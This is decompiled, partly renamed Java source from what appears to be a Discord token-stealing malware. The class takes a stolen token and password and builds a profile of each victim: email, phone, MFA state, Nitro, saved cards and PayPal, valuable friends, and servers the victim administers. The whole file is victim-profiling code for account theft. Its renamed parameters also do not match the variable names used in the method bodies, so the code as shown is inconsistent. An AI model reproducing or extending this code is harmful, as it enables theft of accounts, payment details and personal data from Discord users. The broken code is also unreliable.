/*\n * ========================================\n * DEOBFUSCATED: DiscordProfileCollector.java\n * Original: d/k.java\n * ----------------------------------------\n * Discord profil toplayıcı - email, telefon, Nitro, billing, arkadaşlar, sunucular\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package d;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import d.j;
import d.o;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class k {
    public static Map<String, Object> collectFull(String token, String password, Map<String, Object> existing) {
        Map<String, Object> map2 = k.a(string, string2, map, false);
        if (map2 != null) {
            return map2;
        }
        return k.b(string, string2, map);
    }

    public static Map<String, Object> collectMinimal(String token, String password, Map<String, Object> existing) {
        return k.a(string, string2, map, true);
    }

    private static Map<String, Object> collectInternal(String token, String password, Map<String, Object> map, boolean bl) {
        try {
            Object object;
            String string3;
            String string4 = j.a(string);
            if (string4 == null) {
                try {
                    Thread.sleep(600L);
                }
                catch (InterruptedException interruptedException) {
                    // empty catch block
                }
                string4 = j.a(string);
            }
            if (string4 == null) {
                return null;
            }
            JsonObject jsonObject = JsonParser.parseString(string4).getAsJsonObject();
            if (jsonObject.has("message")) {
                return null;
            }
            JsonObject jsonObject2 = null;
            if (!bl) {
                try {
                    string3 = j.b(string);
                    if (string3 != null) {
                        jsonObject2 = JsonParser.parseString(string3).getAsJsonObject();
                    }
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
            string3 = null;
            String string5 = null;
            String string6 = null;
            if (!bl) {
                try {
                    string3 = j.e(string);
                }
                catch (Exception exception) {
                    // empty catch block
                }
                try {
                    string5 = j.d(string);
                }
                catch (Exception exception) {
                    // empty catch block
                }
                try {
                    string6 = j.c(string);
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
            int n2 = jsonObject.has("public_flags") ? jsonObject.get("public_flags").getAsInt() : 0;
            int n3 = jsonObject.has("premium_type") ? jsonObject.get("premium_type").getAsInt() : 0;
            String string7 = null;
            String string8 = null;
            if (jsonObject2 != null) {
                if (jsonObject2.has("premium_since") && !jsonObject2.get("premium_since").isJsonNull()) {
                    string7 = jsonObject2.get("premium_since").getAsString();
                }
                if (jsonObject2.has("premium_guild_since") && !jsonObject2.get("premium_guild_since").isJsonNull()) {
                    string8 = jsonObject2.get("premium_guild_since").getAsString();
                }
                if (jsonObject2.has("user") && ((JsonObject)(object = jsonObject2.getAsJsonObject("user"))).has("premium_since") && !((JsonObject)object).get("premium_since").isJsonNull()) {
                    string7 = ((JsonObject)object).get("premium_since").getAsString();
                }
            }
            if (string7 == null && jsonObject.has("premium_since") && !jsonObject.get("premium_since").isJsonNull()) {
                string7 = jsonObject.get("premium_since").getAsString();
            }
            if ((object = o.a(n2, jsonObject2)) == null || ((String)object).equals("\u2753")) {
                object = "";
            }
            String string9 = o.a(n3, string7, string8);
            boolean bl2 = o.a(jsonObject2);
            HashMap<String, Object> hashMap = new HashMap<String, Object>();
            hashMap.put("token", string);
            hashMap.put("username", jsonObject.has("username") ? jsonObject.get("username").getAsString() : "Unknown");
            hashMap.put("globalName", jsonObject.has("global_name") && !jsonObject.get("global_name").isJsonNull() ? jsonObject.get("global_name").getAsString() : jsonObject.get("username").getAsString());
            hashMap.put("id", jsonObject.has("id") ? jsonObject.get("id").getAsString() : "");
            hashMap.put("email", jsonObject.has("email") ? jsonObject.get("email").getAsString() : "N/A");
            hashMap.put("phone", jsonObject.has("phone") && !jsonObject.get("phone").isJsonNull() ? k.a(jsonObject.get("phone").getAsString()) : "None");
            hashMap.put("mfa", jsonObject.has("mfa_enabled") && jsonObject.get("mfa_enabled").getAsBoolean() ? "Enabled" : "Disabled");
            hashMap.put("avatar", k.a(jsonObject.has("id") ? jsonObject.get("id").getAsString() : "", jsonObject.has("avatar") && !jsonObject.get("avatar").isJsonNull() ? jsonObject.get("avatar").getAsString() : null));
            hashMap.put("badges", object);
            hashMap.put("nitro", string9);
            hashMap.put("questBadge", bl2);
            hashMap.put("publicFlags", n2);
            hashMap.put("premiumType", n3);
            if (string2 != null) {
                hashMap.put("password", string2);
            }
            Map<String, Object> map2 = k.b(string3);
            hashMap.put("billing", map2);
            Map<String, Object> map3 = k.a(string5, n2, string, bl);
            hashMap.put("friends", map3);
            Map<String, Object> map4 = k.c(string6);
            hashMap.put("guilds", map4);
            if (map != null) {
                hashMap.putAll(map);
            }
            return hashMap;
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static String cleanUsername(String name) {
        if (string == null || string.isEmpty()) {
            return "None";
        }
        return string.startsWith("+") ? string : "+" + string;
    }

    private static String buildAvatarUrl(String userId, String avatarHash) {
        if (string2 == null || string2.isEmpty()) {
            return "https://cdn.discordapp.com/embed/avatars/0.png";
        }
        String string3 = string2.startsWith("a_") ? "gif" : "webp";
        return "https://cdn.discordapp.com/avatars/" + string + "/" + string2 + "." + string3;
    }

    private static Map<String, Object> parseBilling(String json) {
        HashMap<String, Object> hashMap = new HashMap<String, Object>();
        hashMap.put("cards", 0);
        hashMap.put("paypal", false);
        try {
            if (string == null) {
                return hashMap;
            }
            JsonArray jsonArray = JsonParser.parseString(string).getAsJsonArray();
            int n2 = 0;
            boolean bl = false;
            for (JsonElement jsonElement : jsonArray) {
                JsonObject jsonObject = jsonElement.getAsJsonObject();
                if (jsonObject.has("invalid") && jsonObject.get("invalid").getAsBoolean() || !jsonObject.has("type")) continue;
                int n3 = jsonObject.get("type").getAsInt();
                if (n3 == 1) {
                    ++n2;
                }
                if (n3 != 2) continue;
                bl = true;
            }
            hashMap.put("cards", n2);
            hashMap.put("paypal", bl);
        }
        catch (Exception exception) {
            // empty catch block
        }
        return hashMap;
    }

    private static Map<String, Object> parseFriend(String json, int flags, String avatar, boolean isHq) {
        HashMap<String, Object> hashMap = new HashMap<String, Object>();
        hashMap.put("total", 0);
        hashMap.put("hqFriends", new ArrayList());
        try {
            if (string == null) {
                return hashMap;
            }
            JsonArray jsonArray = JsonParser.parseString(string).getAsJsonArray();
            int n3 = 0;
            ArrayList arrayList = new ArrayList();
            for (JsonElement jsonElement : jsonArray) {
                Object object;
                Object object2;
                String string3;
                String string4;
                JsonObject jsonObject;
                JsonObject jsonObject2 = jsonElement.getAsJsonObject();
                if (!jsonObject2.has("type") || jsonObject2.get("type").getAsInt() != 1) continue;
                ++n3;
                if (!jsonObject2.has("user") || !k.a(jsonObject = jsonObject2.getAsJsonObject("user"))) continue;
                HashMap<String, Object> hashMap2 = new HashMap<String, Object>();
                String string5 = jsonObject.get("username").getAsString();
                int n4 = jsonObject.has("public_flags") ? jsonObject.get("public_flags").getAsInt() : 0;
                int n5 = jsonObject.has("premium_type") ? jsonObject.get("premium_type").getAsInt() : 0;
                String string6 = null;
                String string7 = null;
                if (!bl) {
                    string4 = jsonObject.get("id").getAsString();
                    string3 = j.b(string4, string2);
                    if (string3 != null) {
                        try {
                            object2 = JsonParser.parseString(string3).getAsJsonObject();
                            if (((JsonObject)object2).has("premium_type")) {
                                n5 = ((JsonObject)object2).get("premium_type").getAsInt();
                            }
                            if (((JsonObject)object2).has("premium_since") && !((JsonObject)object2).get("premium_since").isJsonNull()) {
                                string6 = ((JsonObject)object2).get("premium_since").getAsString();
                            }
                            if (((JsonObject)object2).has("premium_guild_since") && !((JsonObject)object2).get("premium_guild_since").isJsonNull()) {
                                string7 = ((JsonObject)object2).get("premium_guild_since").getAsString();
                            }
                            if (((JsonObject)object2).has("user")) {
                                object = ((JsonObject)object2).getAsJsonObject("user");
                                if (n5 == 0 && ((JsonObject)object).has("premium_type")) {
                                    n5 = ((JsonObject)object).get("premium_type").getAsInt();
                                }
                                if (string6 == null && ((JsonObject)object).has("premium_since") && !((JsonObject)object).get("premium_since").isJsonNull()) {
                                    string6 = ((JsonObject)object).get("premium_since").getAsString();
                                }
                                if (string7 == null && ((JsonObject)object).has("premium_guild_since") && !((JsonObject)object).get("premium_guild_since").isJsonNull()) {
                                    string7 = ((JsonObject)object).get("premium_guild_since").getAsString();
                                }
                            }
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                    try {
                        Thread.sleep(180L);
                    }
                    catch (InterruptedException interruptedException) {
                        // empty catch block
                    }
                }
                if ((string4 = o.a(n4)) == null || string4.equals("\u2753")) {
                    string4 = "";
                }
                string3 = o.a(n5, string6, null);
                object2 = o.b(string7);
                object = "";
                if (!string3.isEmpty()) {
                    if (!((String)object).isEmpty()) {
                        object = (String)object + " ";
                    }
                    object = (String)object + string3;
                }
                if (!string4.isEmpty()) {
                    if (!((String)object).isEmpty()) {
                        object = (String)object + " ";
                    }
                    object = (String)object + string4;
                }
                if (object2 != null && !((String)object2).isEmpty()) {
                    if (!((String)object).isEmpty()) {
                        object = (String)object + " ";
                    }
                    object = (String)object + (String)object2;
                }
                hashMap2.put("username", string5);
                hashMap2.put("id", jsonObject.get("id").getAsString());
                hashMap2.put("badges", object);
                hashMap2.put("nitro", "");
                hashMap2.put("rareBadges", "");
                hashMap2.put("shortName", string5.length() <= 3);
                arrayList.add(hashMap2);
            }
            hashMap.put("total", n3);
            hashMap.put("hqFriends", arrayList);
        }
        catch (Exception exception) {
            // empty catch block
        }
        return hashMap;
    }

    private static boolean hasHqBadges(JsonObject user) {
        try {
            int n2;
            String string = jsonObject.get("username").getAsString();
            if (string.length() >= 2 && string.length() <= 3) {
                return true;
            }
            if (jsonObject.has("premium_type") && jsonObject.get("premium_type").getAsInt() > 0) {
                return true;
            }
            return jsonObject.has("public_flags") && (((n2 = jsonObject.get("public_flags").getAsInt()) & 1) == 1 || (n2 & 2) == 2 || (n2 & 4) == 4 || (n2 & 8) == 8 || (n2 & 0x200) == 512 || (n2 & 0x4000) == 16384 || (n2 & 0x20000) == 131072 || (n2 & 0x40000) == 262144 || (n2 & 0x400000) == 0x400000);
        }
        catch (Exception exception) {
            return false;
        }
    }

    private static Map<String, Object> parseGuild(String json) {
        HashMap<String, Object> hashMap = new HashMap<String, Object>();
        hashMap.put("total", 0);
        hashMap.put("adminGuilds", new ArrayList());
        try {
            if (string == null) {
                return hashMap;
            }
            JsonArray jsonArray = JsonParser.parseString(string).getAsJsonArray();
            hashMap.put("total", jsonArray.size());
            ArrayList arrayList = new ArrayList();
            for (JsonElement jsonElement : jsonArray) {
                JsonObject jsonObject = jsonElement.getAsJsonObject();
                boolean bl = jsonObject.has("owner") && jsonObject.get("owner").getAsBoolean();
                boolean bl2 = false;
                if (jsonObject.has("permissions") && !jsonObject.get("permissions").isJsonNull()) {
                    long l2 = 0L;
                    try {
                        l2 = jsonObject.get("permissions").getAsJsonPrimitive().isNumber() ? jsonObject.get("permissions").getAsLong() : Long.parseLong(jsonObject.get("permissions").getAsString());
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                    bl2 = (l2 & 8L) == 8L;
                    boolean bl3 = bl2;
                }
                if (!bl && !bl2) continue;
                HashMap<String, Object> hashMap2 = new HashMap<String, Object>();
                hashMap2.put("name", jsonObject.get("name").getAsString());
                hashMap2.put("id", jsonObject.get("id").getAsString());
                hashMap2.put("owner", bl);
                hashMap2.put("admin", bl2);
                hashMap2.put("memberCount", jsonObject.has("approximate_member_count") ? jsonObject.get("approximate_member_count").getAsInt() : 0);
                arrayList.add(hashMap2);
            }
            hashMap.put("adminGuilds", arrayList);
        }
        catch (Exception exception) {
            // empty catch block
        }
        return hashMap;
    }
}

